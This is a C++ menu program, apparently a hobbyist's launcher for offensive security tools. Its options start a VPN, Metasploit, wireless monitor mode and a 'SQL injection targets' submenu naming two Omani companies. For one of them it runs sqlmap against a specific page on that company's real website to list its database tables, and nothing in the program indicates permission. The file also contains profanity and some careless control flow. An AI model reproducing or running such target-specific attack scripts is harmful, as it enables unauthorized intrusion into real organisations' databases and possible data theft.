#include <iostream>
using namespace std;
int main()
{
int w;
int list;
int v;
int e;
int u;
int cl=system("clear");
cout<<cl;
cout<<endl;
cout<<"       ||||||  made by someone in the world who hates everything aka (yasser) ||||||     "<<endl;
cout<<"       ||||||     i hate nano so much ... still i have done this using nano   |||||| "<<endl;
cout<<endl;
cout<<endl; 

cout<<"     ▄█  ▄██████▄     ▄█   ▄█▄    ▄████████    ▄████████              ▄████████ ████████▄   ███    █▄     ▄████████ ████████▄  \n";
cout<<"    ███ ███    ███   ███ ▄███▀   ███    ███   ███    ███             ███    ███ ███    ███  ███    ███   ███    ███ ███   ▀███ \n";
cout<<"    ███ ███    ███   ███▐██▀     ███    █▀    ███    ███             ███    █▀  ███    ███  ███    ███   ███    ███ ███    ███ \n";
cout<<"    ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀             ███        ███    ███  ███    ███   ███    ███ ███    ███ \n";
cout<<"    ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀             ▀███████████ ███    ███  ███    ███ ▀███████████ ███    ███ \n";
cout<<"    ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████                    ███ ███    ███  ███    ███   ███    ███ ███    ███ \n";
cout<<"    ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███              ▄█    ███ ███  ▀ ███  ███    ███   ███    ███ ███   ▄███ \n";
cout<<"█▄ ▄███  ▀██████▀    ███   ▀█▀   ██████████   ███    ███            ▄████████▀   ▀██████▀▄█ ████████▀    ███    █▀  ████████▀  \n";
cout<<"▀▀▀▀▀▀               ▀                        ███    ███                                                                        \n";

cout<<endl;
cout<<endl;
cout<<endl;
cout<<" 1. VPN "<<endl;
cout<<" 2. start metasploit"<<endl;
cout<<" 3. start monitor mode"<<endl;
cout<<" 4. Sql injection targets"<<endl;
cout<<endl;
cout<<endl;
cout<<" 0. EXIT "<<endl;
cout<<endl;
cout<<endl;
cout<<"choose your programme ......= ";
cin>>list;
switch (list) {

case 1 : {
cout<<" YOUR ACCOUNT INFO "<<endl;
cout<<"____________________"<<endl;
cout<<endl;
cout<<"USER: fuck off"<<endl;
cout<<"PASS: again fuck off"<<endl;
cout<<endl;
cout<<"press Enter To Continue..."<<endl;
cin.ignore();
cin.get();
int vpn=system("openvpn --config /root/Desktop/OPENVPN/config/Russia/Russia_UDP_PhyberVPN.ovpn");
cout<<vpn;
break;
}
case 2 :{
int post=system("service postgresql start");
cout<<post;
int clear=system("clear");
cout<<clear;
int msf=system("msfconsole");
cout<<msf;
break;
}
case 3 :{
cout<<"starting monitor mode ....."<<endl;
int mon=system("airmon-ng start wlan0");
cout<<mon<<endl;
cout<<" !!!!     Monitor mode has been set      !!!!"<<endl;
cout<<endl;
cout<<"   Press Enter To Continue..."<<endl;
cin.ignore();
cin.get();
main ();
}
case 0 : {
cout<<"                                            !!  PRESS ENTER TO EXIT !!                 ";
cin.ignore();
cin.get();
exit (0);
int clear=system("clear");
cout<<clear;
}

case 4: {
int clear=system("clear");
cout<<clear;
cout<<endl;
cout<<endl;
cout<<"                                        .oooooo..o   .oooooo.      ooooo        \n";
cout<<"                                       d8P'    `Y8  d8P'  `Y8b     `888'        \n";
cout<<"                                       Y88bo.      888      888     888         \n";
cout<<"                                        ` Y8888o.  888      888     888         \n";
cout<<"                                            ` Y88b 888      888     888         \n";
cout<<"                                       oo     .d8P `88b    d88b     888         \n";
cout<<"                                       8""88888P'   `Y8bood8P'Ybd' o888ooooood8 \n";
cout<<"                                                                                \n";
cout<<"                                                                                \n";
cout<<"                                                                                \n";
cout<<"            ooooooooooooo       .o.       ooooooooo.     .oooooo.    oooooooooooo ooooooooooooo  .oooooo..o \n";
cout<<"            8'   888   `8      .888.      `888   `Y88.  d8P'  `Y8b   `888'     `8 8'   888   `8 d8P'    `Y8 \n";
cout<<"                 888          .8 888.      888   .d88' 888            888              888      Y88bo.      \n";
cout<<"                 888         .8' `888.     888ooo88P'  888            888oooo8         888       ` Y8888o.  \n";
cout<<"                 888        .88ooo8888.    888`88b.    888     ooooo  888              888           ` Y88b \n";
cout<<"                 888       .8'     `888.   888  `88b.  `88.    .88'   888       o      888      oo     .d8P \n";
cout<<"                o888o     o88o     o8888o o888o  o888o  `Y8bood8P'   o888ooooood8     o888o     8""88888P'  \n";
cout<<endl;
cout<<"________________________________________________________________________________________";
cout<<"________________________________________________________________________________________";
cout<<endl;
cout<<"                                            << Select your Target >>                      ";
cout<<endl;
cout<<endl;
cout<<"1. OOMCO (OMAN OIL)"<<endl;
cout<<"2. MITSUBISHI OMAN "<<endl;
cout<<endl;
cout<<"0. RETURN TO MENU";

cout<<endl;
cout<<endl;
cout<<"       Select Your Target .... =        ";
int sql;
cin>>sql;
switch (sql) {
case 0 : {
cout<<"                                            !!  PRESS ENTER TO EXIT !!                 ";
cin.ignore();
cin.get();
main ();
break;
}
case 1 : {
int clear=system("clear");
cout<<clear;
int oomco=system("sqlmap -u http://www.oomco.com/media_news.php?id=202 -D oomco --tables");
cout<<oomco;
break;
}
}
}
}
return 0;
}
